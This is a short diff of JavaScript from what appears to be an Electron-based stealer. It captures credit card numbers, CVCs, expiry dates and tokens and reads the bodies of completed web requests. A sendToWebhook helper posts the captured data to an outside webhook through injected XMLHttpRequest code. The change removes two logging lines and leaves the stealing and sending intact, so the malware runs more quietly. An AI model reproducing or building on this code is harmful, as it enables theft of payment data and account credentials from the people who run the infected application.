@@ -663,7 +663,7 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
 
 // Helpers functions
 async function sendToWebhook(params) {
-    logToFile("sending webhook: content" + JSON.stringify(params))
+    
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
 		xhr.open("POST", "${webhook}", true);
@@ -798,7 +798,7 @@ const Filter = {
 
 session.defaultSession.webRequest.onCompleted(Filter, async (details, callback) => {
     if (details.statusCode != 200) return;
-    logToFile(details.url)
+   
 
     const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
     const data = JSON.parse(unparsed_data)
